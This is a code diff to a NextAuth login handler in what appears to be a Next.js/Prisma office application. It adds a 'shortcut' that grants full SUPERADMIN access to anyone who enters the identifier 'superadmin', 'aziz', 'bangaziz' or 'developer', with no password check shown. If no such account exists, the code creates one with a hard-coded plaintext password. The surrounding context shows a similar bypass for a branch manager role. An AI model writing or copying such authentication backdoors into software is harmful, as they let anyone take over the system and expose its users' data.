@@ -22,6 +22,52 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
         const cleanId = identifier.trim();
         const normalized = cleanId.toLowerCase();
 
+        // Shortcut Superadmin (Bang Aziz — Developer & Control Center Owner): "superadmin", "aziz", "bangaziz"
+        if (
+          normalized === "superadmin" ||
+          normalized === "aziz" ||
+          normalized === "bangaziz" ||
+          normalized === "developer"
+        ) {
+          let superUser = await prisma.user.findFirst({
+            where: {
+              OR: [
+                { role: "SUPERADMIN" },
+                { username: "superadmin" },
+                { username: "aziz" },
+                { name: { contains: "Aziz", mode: "insensitive" } },
+              ],
+            },
+          });
+          if (!superUser) {
+            superUser = await prisma.user.upsert({
+              where: { username: "superadmin" },
+              update: { role: "SUPERADMIN", isActive: true },
+              create: {
+                nip: "999999A220",
+                name: "AZIZ RAHMANSYAH",
+                username: "superadmin",
+                title: "Lead Architect & Superadmin",
+                role: "SUPERADMIN",
+                email: "aziz@planspk.com",
+                phone: "081268000999",
+                password: "dev-authenticated",
+                isActive: true,
+              },
+            });
+          }
+          if (superUser) {
+            return {
+              id: superUser.id,
+              name: superUser.name,
+              email: superUser.email,
+              username: superUser.username,
+              role: superUser.role,
+              title: superUser.title,
+            };
+          }
+        }
+
         // Shortcut Branch Manager (Pimpinan Tertinggi Cabang 220): "branchmanager", "brm", "bm"
         if (
           normalized === "branchmanager" ||
